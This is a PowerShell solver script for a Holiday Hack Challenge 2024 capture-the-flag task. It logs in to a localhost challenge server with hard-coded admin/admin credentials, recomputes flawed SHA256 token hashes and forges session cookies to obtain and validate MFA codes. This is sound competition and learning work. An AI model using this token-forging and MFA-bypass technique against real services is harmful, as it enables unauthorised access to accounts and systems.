<#
    HHC 2024 - Snow-maggedon
    Solver for Act 2 - Powershell Gold
    pahtzo - 20241120
    
    The md5 hash is stored in a text file using the md5 hash string as the filename and content plus a single Unix linefeed 0x0a.
    The developer forgot to use the Trim() function on the md5 hash string prior to storing the hash in the file.
    The ommision of trimming extraneous whitespace causes the sha256 hashing function to hash the string as
    sha256(md5hashstring + 0xa) which is not the same as sha256(md5hash_string).
    
    One of the issues is the fact different platforms use different EOL characters; i.e. Linux platforms use a single linefeed 0x0a,
    whereas Windows platforms, running on Windows store EOL as carriage return linefeed 0x0d 0x0a.
    Another issue is, inside the token_overview.csv file the sha256 hash of the md5 string value is NOT correct since
    the md5 hash string inside the csv file does not contain a linefeed character, this causes our hacking adventure to
    go off the rails until we take the md5 string and directly write it to a temporary file on the filesystem using Set-Content.
    Because Set-Content appends a newline character to the end of the string this method will compute the sha256 hash that will
    match the server side hashing function.
    
    Although powershell is a Microsoft platform, it will follow the underlying OS EOL conventions:
    
    powershell running on Windows: 0x0d 0x0a
    powershell running on Linux: 0x0a
#>

# Build a <cringe>hard-coded credential object</cringe> so we can just paste the script in directly with no prompts.
$username = 'admin'
$password = 'admin'
$pass = ConvertTo-SecureString -AsPlainText $password -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username,$pass

# Save the token_overview.csv to a file in our home directory.
(Invoke-WebRequest -Uri http://localhost:1225/token_overview.csv -Authentication Basic -Credential $cred -AllowUnencryptedAuthentication).Content | Out-File token_overview.csv

# Read the token_overview.csv into an object, filtering out comment lines.
$csv = (Get-Content -Path ./token_overview.csv | Select-String -Pattern "^#" -NotMatch)

# remove the original header line.
$csv = $csv[1..($csv.count - 1)]

# Convert csv to a csv object and add more convienient headers: from $csv.fileMD5hash $csv.Sha256(file_MD5hash) to $csv.md5 $csv.sha256
$csv = $csv | ConvertFrom-Csv -Header 'md5','sha256'

# setup a WebRequestSession and Cookie container.
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie
$cookie.Domain = "localhost"

# process each md5 token, each $token in $csv will have a referenced $token.md5 and $token.sha256 to work with.
foreach($token in $csv){
    # recompute the sha256 from the md5 according to the hints and save it back into the $csv list.
    $token.md5 | Set-Content -Path $token.md5
    $token.sha256 = (Get-Item $token.md5 | Get-FileHash -Algorithm SHA256).Hash
    Remove-Item -Path $token.md5

    # set token cookie to access the endpoint at /tokens/
    $cookie.Name = "token"
    $cookie.Value = $token.md5
    $session.Cookies.Add($cookie);

    # set mfa_token to an empty string so it's clear in our output that we don't need this cookie set for the mfa code request.
    $cookie.Name = "mfa_token"
    $cookie.Value = ""
    $session.Cookies.Add($cookie);

    # build, request, and capture the mfa_code for the mfa_token cookie.
    $url = 'http://localhost:1225/tokens/' + $token.sha256
    "Requesting mfa_code from " + $url
    $mfa_code = (Invoke-WebRequest -Uri $url -Authentication Basic -Credential $cred -AllowUnencryptedAuthentication -WebSession $session).Links.href
    "Got mfa_code " + $mfa_code + " from token at " + $url
    $cooks = $session.Cookies.GetAllCookies()
    foreach($cook in $cooks){"Session cookies: " + $cook.Name + " " + $cook.Value}

    # set the mfa_token cookie to the mfs_code we received.
    $cookie.Name = "mfa_token"
    $cookie.Value = $mfa_code
    $session.Cookies.Add($cookie);

    # request the endpoint at /mfa_validate/ using the token and mfa_token cookies.
    $url = 'http://localhost:1225/mfa_validate/' + $token.sha256
    "Validating mfa_token " + $mfa_token + " at " + $url
    (Invoke-WebRequest -Uri $url -Authentication Basic -Credential $cred -AllowUnencryptedAuthentication -WebSession $session).Content
    $cooks = $session.Cookies.GetAllCookies()
    foreach($cook in $cooks){"Session cookies: " + $cook.Name + " " + $cook.Value}
    "`n"
}
